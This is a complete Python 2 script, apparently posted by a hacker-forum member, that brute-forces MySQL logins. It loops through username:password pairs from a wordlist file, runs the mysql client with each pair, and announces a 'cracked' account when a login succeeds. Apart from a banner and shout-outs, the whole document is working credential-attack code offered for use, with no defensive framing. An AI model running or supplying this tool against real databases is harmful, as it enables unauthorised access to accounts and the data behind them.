#!/usr/bin/python
# Author : KroKite
# Description: Crack the MySQL Username and Password.
# URL: http://facebook.com/r0ckysharma

import subprocess
import re

print '''
        $$ \ $$\   $$$$$$$\  $$$$$$\   $$\   $$\ $$$$$$\ $$$$$$$$\ $$$$$$$$$|
        $$ | $$ |  $$ __$$ \ $$ __$$\  $$ | $$ | \_$$ _| \__$$ __| $$ ______|
        $$ |$$ /   $$ | $$ | $$ / $$ | $$ |$$ /    $$ |     $$ |   $$ |
        $$$$$ /    $$$$$$$ | $$ | $$ | $$$$$ /     $$ |     $$ |   $$$$$$|
        $$$ $$ \   $$ __$$ | $$ | $$ | $$ $$|      $$ |     $$ |   $$ ___|
        $$ |\$$\   $$ | $$ | $$ | $$ | $$ |\$$\    $$ |     $$ |   $$ |
        $$ | \$$\  $$ | $$ | $$$$$$ |  $$ | \$$\ $$$$$$\    $$ |   $$$$$$$$$|
        \__|  \__| \__| \__| \______/  \__| \__| \______|   \__|   \________|
        '''
print "[+] Please Report any Bug to krokite@worldofhacker.com"
print "[+] Greets to: c1ph3r(Krit Kadnok), Nocdem, MayaSeven, Xcode, webDEVIl, b0nd, Aseem Jakhar, Vivek Ramachandran , fb1h2s , Prashant Mahajan, and Other NullCon members, Sukesh Reddy, Sarmanjit Singh, Rakesh Kumar"
print "[+] For Security Releated Discussions, Do Visit us at http://www.garage4hackers.com or http://forum.worldofhacker.com"
print "[+] This Application helps you to crack mysql password with given list"
print "[+] Usage: python mysql_bruteforce.py"
print "\n"
fo = open("password.txt", 'r');
for lines in fo:
        password = lines.split('\n')
        creds = password[0].split(':')
        command = "mysql -u {0} -p{1} -e STATUS".format(creds[0], creds[1])
        brute = subprocess.Popen(command.split(), stdout=subprocess.PIPE)
        if(re.search("Uptime", brute.communicate()[0])):
                print "Password Cracked and your Username:Password is ", creds[0],":",creds[1]
                exit()
~
